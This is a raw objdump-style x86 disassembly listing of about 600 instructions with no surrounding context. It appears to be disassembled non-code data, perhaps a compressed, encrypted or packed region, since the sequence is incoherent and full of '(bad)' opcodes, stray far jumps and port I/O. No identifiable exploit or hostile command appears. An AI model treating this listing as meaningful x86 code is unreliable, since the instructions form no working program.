  420e87:	adc    BYTE PTR [eax-0x44],ah
  420e8a:	gs jo  0x420e3a
  420e8d:	out    0x31,al
  420e8f:	shr    bh,0xc8
  420e92:	sbb    cx,WORD PTR [esi]
  420e95:	add    edx,DWORD PTR [ecx]
  420e97:	fwait
  420e98:	daa    
  420e99:	mov    BYTE PTR [edx+0x7d99eb72],bh
  420e9f:	jns    0x420ecd
  420ea1:	xor    al,0x4d
  420ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ea4:	inc    edx
  420ea5:	push   ebx
  420ea6:	xchg   esi,eax
  420ea7:	jecxz  0x420ea0
  420ea9:	arpl   WORD PTR [edi+ebx*8-0x38],si
  420ead:	loopne 0x420e86
  420eaf:	jmp    0xfc3b4cb4
  420eb4:	dec    ebx
  420eb5:	xor    eax,0xc2863d89
  420eba:	sub    BYTE PTR [eax+0x71],ch
  420ebd:	or     BYTE PTR [eax-0xf],dh
  420ec0:	xor    eax,0x45092d5e
  420ec5:	mov    dh,0x8
  420ec7:	retf   0x4d1d
  420eca:	push   ds
  420ecb:	dec    ecx
  420ecc:	retf   
  420ecd:	sbb    DWORD PTR ds:0x219b0592,edx
  420ed3:	stos   BYTE PTR es:[edi],al
  420ed4:	jg     0x420f3d
  420ed6:	inc    edi
  420ed7:	stos   BYTE PTR es:[edi],al
  420ed8:	xchg   DWORD PTR ds:0x1e9529de,ebp
  420ede:	mov    ch,0x9
  420ee0:	jns    0x420e9d
  420ee2:	ins    BYTE PTR es:[edi],dx
  420ee3:	or     eax,0xde9c4198
  420ee8:	gs ds call 0xd598:0x254c00f0
  420ef1:	dec    edx
  420ef2:	adc    DWORD PTR [edx+0x14],edi
  420ef5:	pop    edx
  420ef6:	mov    al,ds:0x4be92df2
  420efb:	jae    0x420e80
  420efd:	dec    ebp
  420efe:	push   edx
  420eff:	and    eax,0x109fe056
  420f04:	je     0x420e9d
  420f06:	dec    BYTE PTR [edx+0x5d]
  420f09:	cmp    cl,BYTE PTR [ecx]
  420f0b:	adc    eax,0xb6f3a382
  420f10:	icebp  
  420f11:	push   esi
  420f12:	shl    DWORD PTR [ecx-0x3ab00313],1
  420f18:	ret    
  420f19:	and    cl,BYTE PTR [ebx]
  420f1b:	clc    
  420f1c:	sbb    eax,0x3b73d210
  420f21:	jns    0x420f1c
  420f23:	jmp    0x420eea
  420f25:	push   ebp
  420f26:	push   ss
  420f27:	int    0x19
  420f29:	jmp    0xf422:0x27fabc74
  420f30:	out    dx,eax
  420f31:	in     eax,0x2e
  420f33:	adc    DWORD PTR [esi+0x44],0xffffffcb
  420f37:	enter  0x13af,0xc5
  420f3b:	add    esp,DWORD PTR es:[ecx+ebx*8-0x31]
  420f40:	pushf  
  420f41:	push   ebp
  420f42:	or     esp,DWORD PTR [esi]
  420f44:	sbb    eax,0x36a0ef38
  420f49:	mov    BYTE PTR [ecx-0x3f62ec21],ch
  420f4f:	inc    ebx
  420f50:	sub    eax,0x56685e85
  420f55:	jo     0x420f06
  420f57:	xchg   ebp,eax
  420f58:	mov    ebx,0x31f3f4a8
  420f5d:	jge    0x420f61
  420f5f:	stos   DWORD PTR es:[edi],eax
  420f60:	cmp    DWORD PTR [edx-0x69],eax
  420f63:	arpl   WORD PTR [edi],si
  420f65:	jmp    0x19b387f6
  420f6a:	sbb    DWORD PTR [esi+0x3e5858b6],edi
  420f70:	mov    eax,ds:0x430f973b
  420f75:	sbb    ecx,esp
  420f77:	fldenv [ebp+ecx*2+0x58]
  420f7b:	add    dl,dh
  420f7d:	push   ecx
  420f7e:	adc    eax,0x25b5a4f3
  420f83:	xchg   esi,eax
  420f84:	push   es
  420f85:	push   ebx
  420f86:	sti    
  420f87:	mov    bl,0x1c
  420f89:	mul    BYTE PTR [eax+0x5c166d94]
  420f8f:	dec    edi
  420f90:	mul    DWORD PTR [ebx-0x5e]
  420f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f94:	sub    DWORD PTR [esi+0x41],0x56c7cafd
  420f9b:	sar    BYTE PTR [edx+esi*4+0x619baf19],cl
  420fa2:	dec    eax
  420fa3:	nop
  420fa4:	stc    
  420fa5:	jp     0x421013
  420fa7:	repnz mov ebx,0x2a5cec9a
  420fad:	and    eax,0xf9359a44
  420fb2:	pusha  
  420fb3:	add    al,0xce
  420fb5:	or     eax,0x60ef439f
  420fba:	es push ds
  420fbc:	mov    edi,0x9e660609
  420fc1:	imul   edx,ebx,0x54
  420fc4:	mov    eax,ds:0x6f1e3505
  420fc9:	or     ecx,DWORD PTR [edx-0x60]
  420fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fcd:	stc    
  420fce:	loope  0x420fe4
  420fd0:	sub    dh,bl
  420fd2:	push   eax
  420fd3:	sbb    edi,esp
  420fd5:	push   edx
  420fd6:	not    BYTE PTR [eax]
  420fd8:	retf   0x58d6
  420fdb:	adc    ebp,DWORD PTR [ebx-0x228265d3]
  420fe1:	sysenter 
  420fe3:	and    al,0xa1
  420fe5:	es daa 
  420fe7:	dec    esp
  420fe8:	hlt    
  420fe9:	adc    ecx,ebx
  420feb:	adc    eax,0x1879e400
  420ff0:	mov    al,ds:0xa7f87e73
  420ff5:	mov    eax,0x60fa6085
  420ffa:	pushf  
  420ffb:	rol    dh,cl
  420ffd:	mov    DWORD PTR [edi],esi
  420fff:	push   esp
  421000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421001:	lds    ecx,FWORD PTR [edi-0x34722e95]
  421007:	test   eax,0x21258b87
  42100c:	add    ebx,DWORD PTR [edi+0x5c22d68]
  421012:	aaa    
  421013:	popa   
  421014:	mov    dl,0xad
  421016:	mov    ds:0x1d375b81,al
  42101b:	scas   al,BYTE PTR es:[edi]
  42101c:	out    0x4b,eax
  42101e:	int    0x22
  421020:	dec    eax
  421021:	stos   DWORD PTR es:[edi],eax
  421022:	jle    0x42105f
  421024:	sti    
  421025:	es clc 
  421027:	aam    0xd5
  421029:	fstp   QWORD PTR [eax-0x75]
  42102c:	out    0x98,eax
  42102e:	retf   0xada0
  421031:	or     DWORD PTR [edx-0x1103cbb5],edi
  421037:	ins    DWORD PTR es:[edi],dx
  421038:	cwde   
  421039:	cli    
  42103a:	push   ecx
  42103b:	jnp    0x421033
  42103d:	cmovbe edi,edi
  421040:	pop    ecx
  421041:	mov    dl,0x60
  421043:	(bad)  
  421044:	outs   dx,BYTE PTR ds:[esi]
  421045:	adc    ebx,DWORD PTR [ecx+ebx*4-0x69e35819]
  42104c:	scas   eax,DWORD PTR es:[edi]
  42104d:	xor    ch,BYTE PTR [ebx]
  42104f:	jnp    0x421017
  421051:	add    ebx,DWORD PTR [ebx+0x17a9f42]
  421057:	and    DWORD PTR [edi+0x56d53640],edx
  42105d:	out    0xc0,eax
  42105f:	out    dx,eax
  421060:	push   cs
  421061:	mov    cl,0x93
  421063:	jl     0x4210a4
  421065:	int3   
  421066:	stc    
  421067:	dec    esp
  421068:	jno    0x42102f
  42106a:	retf   
  42106b:	mov    ds:0x4386c7af,eax
  421070:	jle    0x421088
  421072:	jbe    0x4210d5
  421074:	dec    edi
  421075:	xchg   DWORD PTR [esp+ecx*4-0x42],ecx
  421079:	sub    al,0xce
  42107b:	sub    eax,0xfd947e20
  421080:	clc    
  421081:	xor    ebp,0x75a2fbcd
  421087:	imul   edi,DWORD PTR [ebx-0x2ba3c35d],0xc6c8b0c5
  421091:	or     al,bl
  421093:	jbe    0x42107f
  421095:	pushf  
  421096:	or     al,0x9f
  421098:	test   ch,dl
  42109a:	mov    cl,0xbd
  42109c:	out    0xde,al
  42109e:	lahf   
  42109f:	iret   
  4210a0:	add    eax,0xccf3be4c
  4210a5:	in     eax,0xa8
  4210a7:	leave  
  4210a8:	ret    
  4210a9:	retf   
  4210aa:	jno    0x42107c
  4210ac:	popa   
  4210ad:	std    
  4210ae:	inc    ebx
  4210af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210b0:	and    BYTE PTR ss:[ebx+0x71a1caff],dl
  4210b7:	or     al,0x1f
  4210b9:	push   0xffffffaf
  4210bb:	jb     0x421057
  4210bd:	test   bl,ah
  4210bf:	sbb    eax,0xa1e9f5e3
  4210c4:	push   eax
  4210c5:	and    al,0x59
  4210c7:	jo     0x421093
  4210c9:	fdivr  DWORD PTR [ecx-0x6e]
  4210cc:	pop    esp
  4210cd:	xchg   esp,eax
  4210ce:	mov    dl,0x28
  4210d0:	cwde   
  4210d1:	mov    cl,0xc4
  4210d3:	int3   
  4210d4:	mov    ebx,0x4064735d
  4210d9:	and    eax,0xe7652900
  4210de:	test   al,0x5c
  4210e0:	shl    BYTE PTR [ecx-0x5f657dd2],0xf4
  4210e7:	cld    
  4210e8:	cmp    BYTE PTR [esi-0x72],0xbc
  4210ec:	scas   al,BYTE PTR es:[edi]
  4210ed:	sti    
  4210ee:	fucomp st(7)
  4210f0:	out    dx,eax
  4210f1:	retf   0x6865
  4210f4:	xchg   ebp,eax
  4210f5:	dec    ecx
  4210f6:	ja     0x4210e0
  4210f8:	jge    0x421131
  4210fa:	ret    0xe810
  4210fd:	mov    dl,0x4f
  4210ff:	cmp    BYTE PTR [edi],0x28
  421102:	icebp  
  421103:	lods   eax,DWORD PTR ds:[esi]
  421104:	(bad)  
  421105:	xchg   ebx,eax
  421106:	lds    esp,FWORD PTR [edx]
  421108:	fisub  DWORD PTR [esi+0x475c8355]
  42110e:	pop    esp
  42110f:	mov    WORD PTR [ebp+edx*8+0x42],?
  421113:	adc    eax,0x618f16cb
  421118:	or     BYTE PTR [ecx-0x70],al
  42111b:	pop    eax
  42111c:	fcom   DWORD PTR [esi]
  42111e:	jnp    0x421113
  421120:	div    DWORD PTR [eax-0x39b48e05]
  421126:	call   0xac0a:0xab933782
  42112d:	xchg   BYTE PTR [edx],ch
  42112f:	mov    dl,0x93
  421131:	fdivr  DWORD PTR [esi-0x299e4e9f]
  421137:	aad    0x1
  421139:	loopne 0x421134
  42113b:	adc    eax,0xe5ef32c9
  421140:	(bad)  
  421141:	aaa    
  421142:	lods   eax,DWORD PTR ds:[esi]
  421143:	cmc    
  421144:	mov    eax,ds:0x9b0c0533
  421149:	sub    DWORD PTR [ebp+0x58],esi
  42114c:	adc    ah,al
  42114e:	add    eax,0x91bd30c
  421153:	jnp    0x421143
  421155:	jmp    DWORD PTR [ebp+ebp*4-0x10fad0eb]
  42115c:	add    eax,0xe0bcdaec
  421161:	pop    ebp
  421162:	jg     0x421116
  421164:	push   ss
  421165:	mov    cl,0x2
  421167:	add    al,0xaa
  421169:	add    ah,BYTE PTR [edi+0x5f]
  42116c:	lods   eax,DWORD PTR ds:[esi]
  42116d:	fs push ecx
  42116f:	test   BYTE PTR [edx+edi*8-0x4ff4677a],bl
  421176:	jo     0x421107
  421178:	xor    eax,0xdefeff4f
  42117d:	iret   
  42117e:	lods   al,BYTE PTR ds:[esi]
  42117f:	cmc    
  421180:	cmp    DWORD PTR [ebx-0x17552869],edi
  421186:	jecxz  0x421176
  421188:	icebp  
  421189:	mov    ah,0xed
  42118b:	or     ch,BYTE PTR [ebp-0x6b6727cc]
  421191:	clc    
  421192:	ficom  DWORD PTR [ecx-0x4c6337b1]
  421198:	das    
  421199:	mov    ebp,0x16784534
  42119e:	pop    ds
  42119f:	retf   0x5c48
  4211a2:	(bad)  
  4211a3:	pop    esi
  4211a4:	in     al,dx
  4211a5:	nop
  4211a6:	jg     0x4211b2
  4211a8:	xor    ah,ah
  4211aa:	inc    ecx
  4211ab:	pop    es
  4211ac:	js     0x4211e0
  4211ae:	in     eax,0xf4
  4211b0:	(bad)  
  4211b1:	out    0x73,eax
  4211b3:	fist   WORD PTR [edi+edi*1+0x61]
  4211b7:	call   0x1ba5:0x9f4662d6
  4211be:	xor    ebp,DWORD PTR [edx]
  4211c0:	nop
  4211c1:	ds ret 0x293f
  4211c5:	mov    eax,ds:0x33696c81
  4211ca:	(bad)
  4211cd:	into   
  4211ce:	sti    
  4211cf:	jge    0x421216
  4211d1:	jo     0x4211d6
  4211d3:	bound  ebp,QWORD PTR [eax]
  4211d5:	icebp  
  4211d6:	push   esp
  4211d7:	mov    esi,0xe45d3d2a
  4211dc:	jmp    0x42121e
  4211de:	cmp    BYTE PTR [edx],ah
  4211e0:	cld    
  4211e1:	fdivr  st(4),st
  4211e3:	push   eax
  4211e4:	cmc    
  4211e5:	cmp    al,0x1d
  4211e7:	mov    edi,0x9d74fd46
  4211ec:	out    0xe6,al
  4211ee:	xchg   ebp,eax
  4211ef:	les    ecx,FWORD PTR [esi+ecx*1-0x35]
  4211f3:	imul   ecx,DWORD PTR [ecx-0x184b3a4e],0xb02a959e
  4211fd:	jecxz  0x421245
  4211ff:	mov    ebx,0xf0ca0d27
  421204:	sti    
  421205:	stc    
  421206:	int3   
  421207:	aam    0x6a
  421209:	sbb    BYTE PTR ds:0x2e01315f,al
  42120f:	pop    ebx
  421210:	xchg   ebx,eax
  421211:	jo     0x421260
  421213:	pop    esi
  421214:	sub    al,0x8a
  421216:	sub    al,0xad
  421218:	mov    ch,0x2f
  42121a:	ja     0x42121e
  42121c:	cld    
  42121d:	mov    ds:0xea25158d,al
  421222:	jle    0x421215
  421224:	add    BYTE PTR [edi],dh
  421226:	mov    edx,ds
  421228:	std    
  421229:	push   eax
  42122a:	test   DWORD PTR [ecx+0x14299a67],0x7d5ac70c
  421234:	and    DWORD PTR [esp+eax*4-0x5044c3a1],esp
  42123b:	adc    eax,0x6973a7f9
  421240:	push   esi
  421241:	dec    esp
  421242:	sbb    DWORD PTR [edx+eax*1-0x44f72705],edi
  421249:	mov    ds:0x95121ccc,al
  42124e:	stc    
  42124f:	bound  ebp,QWORD PTR [edx]
  421251:	add    eax,0x409bcc70
  421256:	jno    0x421216
  421258:	addr16 sub eax,0xdb6679cf
  42125e:	jge    0x42120d
  421260:	imul   ebp,DWORD PTR [ebx],0x3531ad75
  421266:	pop    ds
  421267:	jo     0x4212b5
  421269:	repz adc DWORD PTR [edi+0x421b85b7],0x3
  421271:	xor    BYTE PTR [ebp+eax*4-0xf],cl
  421275:	xchg   esi,eax
  421276:	add    al,0x53
  421278:	int    0x7f
  42127a:	and    ebp,0x32
  42127d:	fs jl  0x421210
  421280:	push   ecx
  421281:	(bad)  
  421282:	out    0xf4,al
  421284:	pop    es
  421285:	js     0x421267
  421287:	sahf   
  421288:	inc    ebp
  421289:	inc    esp
  42128a:	fistp  DWORD PTR [ebx-0x48518149]
  421290:	jle    0x4212d9
  421292:	nop
  421293:	add    eax,0x4a7aafad
  421298:	enter  0x22dd,0xf0
  42129c:	outs   dx,BYTE PTR ds:[esi]
  42129d:	fld    DWORD PTR [ebx-0x78e8459d]
  4212a3:	mov    ah,bh
  4212a5:	stc    
  4212a6:	mov    al,ds:0xc12b4b9d
  4212ab:	jns    0x4212da
  4212ad:	and    al,bl
  4212af:	or     eax,0x9f6c0130
  4212b4:	mov    ah,0x8
  4212b6:	mov    ecx,0x82e2cf7c
  4212bb:	and    al,0x5d
  4212bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212be:	xchg   ebx,eax
  4212bf:	js     0x4212de
  4212c1:	xor    eax,0x55517dcc
  4212c6:	or     eax,0xc7147aa3
  4212cb:	addr16 push cs
  4212cd:	repz inc esp
  4212cf:	ret    
  4212d0:	jae    0x421304
  4212d2:	sbb    al,0xd6
  4212d4:	das    
  4212d5:	ficomp WORD PTR [eax]
  4212d7:	inc    DWORD PTR [ecx]
  4212d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212db:	lea    esp,[ecx+0x37b1df65]
  4212e1:	shl    BYTE PTR [eax+0xe19727a],0x91
  4212e8:	and    DWORD PTR [ecx+0xd12062e],ecx
  4212ee:	adc    al,0xdd
  4212f0:	mov    ebx,0x711b0db3
  4212f5:	sub    BYTE PTR [ebp-0x3a5444c8],al
  4212fb:	xor    esp,edi
  4212fd:	outs   dx,DWORD PTR ds:[esi]
  4212fe:	jg     0x4212ab
  421300:	in     eax,dx
  421301:	xor    BYTE PTR [edi+0x5d],0xbd
  421305:	mov    al,0xa3
  421307:	mov    bl,0x49
  42130a:	cmp    ah,BYTE PTR [esi-0x17575308]
  421310:	imul   esp,DWORD PTR [esi],0x64c61e7c
  421316:	pop    ss
  421317:	or     eax,0x62d6a487
  42131c:	in     eax,dx
  42131d:	sub    DWORD PTR [esi],0xfffffff8
  421320:	push   ds
  421321:	mov    edx,ss
  421323:	sar    DWORD PTR [eax],0x8d
  421326:	push   0x56
  421328:	dec    edx
  421329:	add    DWORD PTR [edx+0x1d017f58],eax
  42132f:	inc    edi
  421330:	fst    QWORD PTR [edi+0x22c9f261]
  421336:	inc    esp
  421337:	pop    ss
  421338:	adc    dh,BYTE PTR ds:0x1dc447d6
  42133e:	cmp    BYTE PTR [edi+ebp*8-0x256f7eac],ch
  421345:	push   ss
  421346:	mov    edi,0x8953d98e
  42134b:	je     0x42134b
  42134d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42134e:	mov    ch,0x1d
  421350:	(bad)  
  421351:	ins    BYTE PTR es:[edi],dx
  421352:	mov    cs,WORD PTR [eax]
  421354:	cmp    BYTE PTR [edi],bl
  421356:	or     DWORD PTR [esi+0x33],eax
  421359:	mov    edx,cs
  42135b:	call   0x2123904e
  421360:	cmovbe eax,DWORD PTR [edx]
  421363:	outs   dx,DWORD PTR ds:[esi]
  421364:	data16 add BYTE PTR [eax+0x57],dl
  421368:	sub    edi,esp
  42136a:	inc    edx
  42136b:	ret    
  42136c:	jns    0x42138b
  42136e:	ficom  WORD PTR [ebx+0x67]
  421371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421372:	or     eax,ebx
  421374:	add    ebp,ebx
  421376:	inc    ebp
  421377:	sahf   
  421378:	shl    ebp,1
  42137a:	mov    bh,0x3d
  42137c:	rcl    BYTE PTR [ecx+0x6d],0x2b
  421380:	xor    cl,BYTE PTR [edi]
  421382:	add    ebp,edi
  421384:	adc    dh,BYTE PTR [ebx+0x31601517]
  42138a:	push   0xffffff84
  42138c:	pop    edi
  42138d:	pop    edx
  42138e:	sub    ah,0xf6
  421391:	fnstsw WORD PTR [edi-0x481cf930]
  421397:	shl    edi,cl
  421399:	ret    0xb2ee
  42139c:	lock sub dl,BYTE PTR [ecx]
  42139f:	mov    ebp,0x4f75979
  4213a4:	mov    esp,0x7da23882
  4213a9:	into   
  4213aa:	pop    edx
  4213ab:	sub    BYTE PTR [eax],dh
  4213ad:	jbe    0x421350
  4213af:	adc    DWORD PTR [ebx-0x55eb0703],edi
  4213b5:	mov    bl,0x5
  4213b7:	lea    esp,[ebp+0x190e4a24]
  4213bd:	scas   al,BYTE PTR es:[edi]
  4213be:	mov    bl,0xed
  4213c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213c1:	xor    edi,eax
  4213c3:	mov    ds:0x21fcfa31,al
  4213c8:	or     DWORD PTR [edi*2-0x534ea044],edx
  4213cf:	fisttp DWORD PTR [esi+0x4403c914]
  4213d5:	pop    edx
  4213d6:	xchg   edi,eax
  4213d7:	inc    eax
  4213d8:	adc    eax,0x33678330
  4213dd:	sub    eax,0x55c1e766
  4213e2:	mov    ds:0x1b015033,eax
  4213e7:	js     0x4213b7
  4213e9:	push   ss
  4213ea:	cwde   
  4213eb:	mov    al,ds:0xcd88b2a9
  4213f0:	mov    ss:0x510b0c28,eax
  4213f6:	sub    BYTE PTR [ecx],ah
  4213f8:	jns    0x421475
  4213fa:	push   ds
  4213fb:	push   DWORD PTR [ebx-0x70b9eab7]
  421401:	jle    0x4213e2
  421403:	mov    ds:0x967416be,eax
  421408:	loop   0x42141b
  42140a:	(bad)  
  42140b:	xor    edx,DWORD PTR [edi+0x51]
  42140e:	test   al,0x16
  421410:	not    BYTE PTR [edx+0x4b]
  421413:	lahf   
  421414:	jne    0x421429
  421416:	xchg   esi,eax
  421417:	call   0xdfc6d244
  42141c:	daa    
  42141d:	add    eax,0xa3c26728
  421422:	scas   al,BYTE PTR es:[edi]
  421423:	lods   al,BYTE PTR ds:[esi]
  421424:	dec    esp
  421425:	xchg   edx,eax
  421426:	pop    ss
  421427:	xchg   esi,eax
  421428:	mov    BYTE PTR [esi-0x492357b8],ch
  42142e:	mov    edx,0xad18e7dd
  421433:	lea    ebp,[ecx-0x68]
  421436:	in     eax,0x1a
  421438:	jmp    0xe9010c6c
  42143d:	push   eax
  42143e:	or     BYTE PTR [edi],bh
  421440:	dec    ebx
  421441:	and    al,BYTE PTR [eax-0x78bb8173]
  421447:	and    bh,BYTE PTR [eax]
  421449:	or     ebp,DWORD PTR [edi-0x51]
  42144c:	lea    edx,[eax+eax*8]
  42144f:	mov    ebx,DWORD PTR [ecx+0x51f2a2a]
  421455:	fcomp  st(6)
  421457:	daa    
  421458:	ja     0x4214bb
  42145a:	xchg   edi,eax
  42145b:	pop    edx
  42145c:	adc    DWORD PTR [ebp+0x621ea7f2],esp
  421462:	sbb    BYTE PTR [esi+0x79],ch
  421465:	mov    BYTE PTR [ebx-0x1df1e33f],cl
  42146b:	test   al,0x69
  42146d:	das    
  42146e:	inc    eax
  42146f:	mov    esp,eax
  421471:	(bad)  
  421472:	rcr    bl,cl
  421474:	icebp  
  421475:	mov    cl,0x83
  421477:	fbstp  TBYTE PTR [ebx]
  421479:	or     ch,BYTE PTR [esi]
  42147b:	push   edi
  42147c:	mov    dh,0x1d
  42147e:	push   ebp
  42147f:	dec    ebp
  421480:	xchg   esp,eax
  421481:	sub    esi,eax
  421483:	xor    al,0xb8
  421485:	add    esi,DWORD PTR [edx]
  421487:	sub    ebp,DWORD PTR [edi]
  421489:	xchg   edx,eax
  42148a:	xor    eax,0x26fd6b08
  42148f:	lods   al,BYTE PTR gs:[esi]
  421491:	popa   
  421492:	xor    al,0x91
  421494:	mov    bh,0x9e
  421496:	stos   DWORD PTR es:[edi],eax
  421497:	push   edi
  421498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421499:	cmp    ebp,DWORD PTR [eax+0x65c22989]
  42149f:	push   esp
  4214a0:	sub    cl,BYTE PTR [ebp+0x67]
  4214a3:	pop    edi
  4214a4:	mov    ah,0xf9
  4214a6:	fmul   DWORD PTR [ebx+0x6e]
  4214a9:	sahf   
  4214aa:	pop    edi
  4214ab:	lods   eax,DWORD PTR ds:[esi]
  4214ac:	xor    al,0xf1
  4214ae:	push   0x33841b7a
  4214b3:	push   ebp
  4214b4:	jb     0x42148f
  4214b6:	(bad)  
  4214b7:	xchg   esp,eax
  4214b8:	nop
  4214b9:	cmp    al,0xc6
  4214bb:	test   bh,0x4
  4214be:	push   ss
  4214bf:	pop    esp
  4214c0:	inc    esi
  4214c1:	imul   esp,DWORD PTR [edi+0x76],0x2b6f82af
  4214c8:	jno    0x4214ab
  4214ca:	ds xchg edx,eax
  4214cc:	mov    bh,0x6d
  4214ce:	sbb    cl,BYTE PTR [ecx+0x6eeec23e]
  4214d4:	inc    esp
  4214d5:	imul   edi,ecx,0x5f
  4214d8:	cmp    eax,DWORD PTR [ebx+0x7e]
  4214db:	lods   al,BYTE PTR ds:[esi]
  4214dc:	mov    bh,0x92
  4214de:	push   0xffffffeb
  4214e0:	or     eax,0xe0ba0556
  4214e5:	outs   dx,DWORD PTR ds:[esi]
  4214e6:	jg     0x421567
  4214e8:	rcl    BYTE PTR [edx],1
  4214ea:	mov    ebx,0x4d3ee085
  4214ef:	shr    bl,1
  4214f1:	and    ch,BYTE PTR [ecx-0x737c5115]
  4214f7:	out    dx,al
  4214f8:	out    dx,al
  4214f9:	push   0xffffff9b
  4214fb:	cmp    eax,0xf20e6234
  421500:	xor    al,0x44
  421502:	je     0x421537
  421504:	sub    edi,DWORD PTR [ecx]
  421506:	mov    ecx,esp
  421508:	and    esp,DWORD PTR [esi+ebx*1-0x152d168b]
  42150f:	jp     0x421505
  421511:	xor    dh,BYTE PTR [ebp+0x43]
  421514:	rcl    DWORD PTR [ecx+0x67a32ecc],cl
  42151a:	xchg   esp,eax
  42151b:	(bad)  
  42151c:	xor    al,BYTE PTR [esi-0x7b929305]
  421522:	jbe    0x42151e
  421524:	pushf  
  421525:	bound  esi,QWORD PTR [ecx]
  421527:	sub    dh,BYTE PTR [eax]
  421529:	pop    ebx
  42152a:	mov    ah,BYTE PTR [ebp+eax*1+0x4e]
  42152e:	mov    edx,0xf59bc711
  421533:	pop    ecx
  421534:	cdq    
  421535:	(bad)  
  421537:	loope  0x4214ed
  421539:	sbb    cl,BYTE PTR [eax-0x6a93a260]
  42153f:	inc    edi
  421540:	mov    ds:0x67233059,al
  421545:	in     al,0xf8
  421547:	inc    edx
  421548:	aad    0x3e
  42154a:	daa    
  42154b:	sbb    cl,BYTE PTR [edi-0x7cb6027c]
  421551:	es push eax
  421553:	push   ecx
  421554:	imul   ebx,DWORD PTR [esi+0x4e2195b6]
  42155b:	xchg   BYTE PTR ds:[eax+0x104d7646],ch
  421562:	pop    eax
  421563:	mov    ds:0xaf4e4fc1,eax
  421568:	mov    ?,WORD PTR [eax]
  42156a:	sbb    cl,BYTE PTR [esi+0x54bc8dfb]
  421570:	inc    edi
  421571:	adc    bh,bl
  421573:	jle    0x421551
  421575:	loopne 0x421532
  421577:	xchg   esp,eax
  421578:	nop
  421579:	and    DWORD PTR [eax+esi*8-0x2674ef6],0xffffff87
  421581:	sub    BYTE PTR [ebx],bl
  421583:	pop    ds
  421584:	int3   
  421585:	scas   al,BYTE PTR es:[edi]
  421586:	retf   
  421587:	xchg   dh,al
  421589:	sbb    edi,DWORD PTR [ebp+0x68]
  42158c:	mov    ebx,0x658956d7
  421591:	ror    DWORD PTR [eax-0x5421ca5d],cl
  421597:	mov    eax,0xa23204c5
  42159c:	jbe    0x421527
  42159e:	push   cs
  42159f:	xor    BYTE PTR [edx],al
  4215a1:	sti    
  4215a2:	adc    esi,eax
  4215a4:	push   ds
  4215a5:	or     al,0x16
  4215a7:	push   ecx
  4215a8:	add    esp,DWORD PTR es:[edi]
  4215ab:	bound  esp,QWORD PTR [esi-0x3f44f1b1]
  4215b1:	arpl   WORD PTR [esi+0xc9fd8f4],cx
  4215b7:	mov    WORD PTR [esi],es
  4215b9:	or     BYTE PTR [ebp-0x78c2db4f],ah
  4215bf:	xor    al,0xd3
  4215c1:	pop    esi
  4215c2:	push   0x7766fd77
  4215c7:	xchg   BYTE PTR [ebp+ebp*2-0x1b94030c],cl
  4215ce:	out    dx,al
  4215cf:	mov    esp,0xdff2c8ff
  4215d4:	scas   al,BYTE PTR es:[edi]
  4215d5:	jge    0x42164a
  4215d7:	in     eax,dx
  4215d8:	retf   
  4215d9:	mov    ecx,0xecd34067
  4215de:	xlat   BYTE PTR ds:[ebx]
  4215df:	pop    ebp
  4215e0:	fdiv   QWORD PTR [eax+edi*1-0x35b0997]
  4215e7:	dec    esp
  4215e8:	stc    
  4215e9:	sbb    ch,0x4b
  4215ec:	aam    0x39
  4215ee:	mov    dl,0x83
  4215f0:	pop    ebx
  4215f1:	test   DWORD PTR [eax+0x19e4f70],esi
  4215f7:	mov    dl,0xc5
  4215f9:	int3   
  4215fa:	daa    
  4215fb:	test   eax,0x95fc5ff5
  421600:	pop    es
  421601:	fnstenv [edi+0x7a5c34c0]
  421607:	ins    BYTE PTR es:[edi],dx
  421608:	add    DWORD PTR [edi-0x1c],edx
  42160b:	add    eax,0x125c8738
  421610:	out    0x5b,eax
  421612:	cmovs  edx,DWORD PTR [ebp-0x1e]
  421616:	loope  0x4215b1
  421618:	aad    0x5e
  42161a:	repz push ds
  42161c:	imul   edx,DWORD PTR ds:0x8078581c,0x4b
  421623:	sahf   
  421624:	pop    ss
  421625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421626:	mov    ebp,0x56bb7b84
  42162b:	dec    edi
  42162c:	mov    esi,DWORD PTR [ebx+0x57]
  42162f:	ss mov al,0xd0
  421632:	and    al,0xcb
  421634:	and    esp,DWORD PTR [edi]
  421636:	data16 xchg ah,bl
  421639:	ror    DWORD PTR [esi-0x1a1034d1],cl
  42163f:	lock iret 
  421641:	xor    DWORD PTR [ecx-0x19],edx
  421644:	sti    
  421645:	lods   eax,DWORD PTR ds:[esi]
  421646:	add    DWORD PTR [edx-0x25],edx
  421649:	mov    bh,0x62
  42164b:	jne    0x421625
  42164d:	aam    0x51
  42164f:	jno    0x42162f
  421651:	push   cs
  421652:	mov    edx,0xf74913b5
  421657:	sub    BYTE PTR [ecx],ah
  421659:	lea    ebp,[esi+0x49f0be05]
  42165f:	mov    edi,0xd2bfebdf
  421664:	rol    DWORD PTR [eax+0x1583d440],0xfe
  42166b:	stos   DWORD PTR es:[edi],eax
  42166c:	addr16 mov al,0xe
  42166f:	rcl    DWORD PTR [ebx],1
  421671:	pop    DWORD PTR gs:[esi-0x6c486a51]
  421678:	cs mov cl,0x72
  42167b:	sub    ah,0xef
  42167e:	loopne 0x4216e7
  421680:	xchg   edx,eax
  421681:	mov    BYTE PTR [edx-0x3c34134],bh
  421687:	ror    ebp,1
  421689:	mov    DWORD PTR [ebx],ebx
  42168b:	jno    0x4216de
  42168d:	nop
  42168e:	add    DWORD PTR [esi],edi
  421690:	mov    ecx,0xc2fd4bfa
  421695:	xor    DWORD PTR [esi],esi
  421697:	ins    BYTE PTR es:[edi],dx
  421698:	sar    DWORD PTR [ebp+0x50544f73],0x9c
  42169f:	dec    esi
  4216a0:	sub    DWORD PTR ds:0xfdb2588a,ebx
  4216a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216a7:	mov    bl,0x22
  4216a9:	nop
  4216aa:	push   eax
